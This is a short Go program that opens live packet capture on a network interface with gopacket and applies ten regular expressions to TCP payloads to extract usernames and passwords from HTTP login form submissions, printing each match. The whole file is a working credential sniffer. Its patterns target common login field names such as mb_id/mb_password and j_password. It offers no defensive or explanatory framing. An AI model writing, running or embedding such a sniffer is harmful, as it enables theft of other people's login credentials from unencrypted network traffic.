package main

import (
	"fmt"
	"log"
    "regexp"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
    res = []*regexp.Regexp{
        regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
        regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
        regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
        regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
        regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
        regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
        regexp.MustCompile(`userid=(.+)&userpw=(.+)`),
        regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
        regexp.MustCompile(`&id=(.+)&pw=(.+)`),
        regexp.MustCompile(`username=(.+)&j_password=(.+)`),
    }
)

func parse(device pcap.Interface) {
	snapshot_len := int32(1024)
	promiscuous := false
	timeout := 30 * time.Second
	var err error
	var handle *pcap.Handle

	// Open device
	handle, err = pcap.OpenLive(device.Name, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		if tcpLayer != nil {
			tcpPacket := tcpLayer.(*layers.TCP)
			http := string(tcpPacket.Payload)

            for _, re := range res {
                ss := re.FindAllStringSubmatch(http, -1)
                for _, s := range ss {
                    fmt.Println(s)
                }
            }

		}
	}
}
